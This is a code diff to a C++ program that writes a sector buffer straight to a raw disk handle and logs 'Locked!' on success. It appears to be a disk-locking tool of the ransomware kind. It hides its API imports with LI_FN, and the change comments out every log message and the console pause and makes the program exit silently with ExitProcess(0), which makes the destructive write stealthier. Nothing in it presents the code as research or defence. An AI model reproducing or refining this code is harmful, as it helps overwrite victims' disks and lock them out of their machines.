@@ -36,20 +36,22 @@ wmain(
 			LI_FN(SetFilePointer)(DiskHandle, Pos.LowPart, &Pos.HighPart, FILE_BEGIN);
 			if (LI_FN(WriteFile)(DiskHandle, Sector, static_cast<DWORD>(sizeof(Sector)), &Bytes, nullptr))
 			{
-				spdlog::info("Locked!");
+				//spdlog::info("Locked!");
 			}
-			else
-				spdlog::error("WriteFile error,GetLastError(): {}", GetLastError());
+			// 			else
+			// 				spdlog::error("WriteFile error,GetLastError(): {}", GetLastError());
 		}
-		else
-			spdlog::error("ReadFile error,GetLastError(): {}", GetLastError());
+		// 		else
+		// 			spdlog::error("ReadFile error,GetLastError(): {}", GetLastError());
 
 		LI_FN(CloseHandle)(DiskHandle);
 	}
-	else
-		spdlog::error("CreateFile error,GetLastError(): {}", GetLastError());
+	// 	else
+	// 		spdlog::error("CreateFile error,GetLastError(): {}", GetLastError());
 
-	_getch();
+	// 	_getch();
+	//
+	// 	return GetLastError();
 
-	return GetLastError();
+	ExitProcess(0);
 }
